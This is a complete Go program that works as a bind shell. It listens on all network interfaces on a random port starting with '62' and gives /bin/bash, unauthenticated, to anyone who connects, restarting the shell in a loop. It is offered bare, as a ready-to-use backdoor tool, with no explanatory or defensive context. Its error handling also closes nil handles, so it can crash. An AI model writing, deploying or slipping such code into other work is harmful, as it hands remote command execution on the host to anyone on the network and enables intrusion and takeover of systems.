package main

import (
	"fmt"
	"math/rand"
	"net"
	"os/exec"
	"strconv"
	"time"
)

var host string = "0.0.0.0"
var port string

func main() {
	port = "62" + getPort(0, "")
	do()
}

func do() {
	fmt.Println("Listening on port " + port)
	shell()
}

func reset() {
	time.Sleep(1 * time.Second)
	do()
}

func getPort(i int, p string) string {
	i++
	if i > 3 {
		return p
	}
	p = p + strconv.Itoa(random(10))
	return getPort(i, p)
}

func random(n int) int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(n)
}

func shell() {
	list, err := net.Listen("tcp", host+":"+port)
	if err != nil {
		fmt.Println(err.Error())
		list.Close()
		reset()
		return
	}
	con, err := list.Accept()
	if err != nil {
		fmt.Println(err.Error())
		list.Close()
		con.Close()
		reset()
		return
	}
	fmt.Println("Connection established")
	for {
		cmd := exec.Command("/bin/bash")
		//Set input/output to the established connection's in/out
		cmd.Stdin = con
		cmd.Stdout = con
		cmd.Stderr = con
		cmd.Run()
	}
}
